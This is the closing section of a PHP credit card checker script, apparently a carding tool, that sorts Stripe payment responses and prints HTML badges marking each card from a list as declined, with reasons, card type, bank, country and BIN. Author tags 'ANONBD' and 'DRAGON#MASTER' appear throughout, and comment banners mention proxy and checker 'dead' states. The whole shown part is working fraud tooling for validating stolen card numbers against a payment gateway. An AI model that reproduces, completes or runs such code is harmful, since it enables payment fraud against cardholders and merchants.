    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Parameter Invalid Empty</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "lock_timeout")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Lock Timeout</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  "transaction_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Transaction Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2, "window.location.href")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: 3D Secure Redirect</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Is Declined By Your Bank, Please Contact Them For Additional Information.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹 👑 </span></br>';
  } 

elseif
(strpos($result2, "missing_payment_information")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Missing Payment Information</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Payment Cannot Be Processed, Missing Credit Card Number</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  } 

# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #



# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #

elseif 
(strpos($result2,  '-1')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Update Nonce </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  }

else {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Dead</span> | <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span> | <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
  }
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

//echo "<b>Result:</b> $result1<br><br>";
echo "<b>Result:</b> $result2<br><br>";

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#

?>
